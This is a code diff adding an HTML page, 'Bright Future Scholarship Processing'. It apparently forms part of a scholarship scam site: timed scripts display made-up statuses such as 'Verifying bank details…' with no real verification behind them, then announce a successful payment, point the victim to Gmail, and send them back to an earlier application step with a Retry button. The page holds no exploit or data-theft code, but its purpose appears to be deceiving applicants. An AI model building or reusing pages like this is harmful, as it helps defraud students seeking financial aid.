@@ -1,0 +1,57 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<link rel="stylesheet" href="style.css">
+<title>Bright Future Scholarship Processing</title>
+<style>
+  * { margin:0; padding:0; box-sizing:border-box; font-family: Arial, sans-serif; }
+  body {
+    background:#0a1a3a; color:#fff; min-height:100vh;
+    display:flex; align-items:center; justify-content:center; text-align:center; padding:20px;
+  }
+</style>
+</head>
+<body>
+  <div class="box">
+    <div class="spinner" id="spinner"></div>
+    <h1>Verifying your payment…</h1>
+    <p>Please do not close this window or refresh the page.</p>
+    <div class="status" id="status">Connecting to payment gateway…</div>
+
+    <div class="retry-box" id="retryBox">
+      <div class="t">✔ Payment verification SUCCESS</div>
+      <p>We will inform you through Gmail please check regularly.</p>
+      <p>Didn't receive an email? Try again</p>
+      <button class="retry-btn" id="retryBtn">Retry</button>
+    </div>
+  </div>
+
+<script>
+  var statuses = [
+    'Connecting to payment gateway…',
+    'Verifying bank details…',
+    'Confirming scholarship eligibility…',
+    'Finalizing release…'
+  ];
+  var i = 0;
+  var el = document.getElementById('status');
+  var iv = setInterval(function(){
+    i++;
+    if (i < statuses.length) {
+      el.textContent = statuses[i];
+    } else {
+      clearInterval(iv);
+      document.getElementById('spinner').style.display = 'none';
+      el.textContent = '';
+      document.getElementById('retryBox').classList.add('show');
+    }
+  }, 1600);
+
+  document.getElementById('retryBtn').addEventListener('click', function(){
+    window.location.href = 'apply_step3.html';
+  });
+</script>
+</body>
+</html>
